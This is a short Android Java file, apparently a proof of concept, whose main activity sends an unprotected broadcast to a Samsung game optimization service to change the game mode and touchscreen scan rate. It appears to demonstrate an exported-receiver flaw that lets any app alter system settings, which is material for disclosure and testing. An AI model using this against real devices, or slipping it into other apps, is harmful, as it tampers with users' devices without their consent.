package poc.app;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent i = new Intent("com.samsung.android.game.gos.action.TSP");
        i.putExtra("set_game_mode", "1");
        i.putExtra("set_scan_rate", "1");
        sendBroadcast(i);
    }
}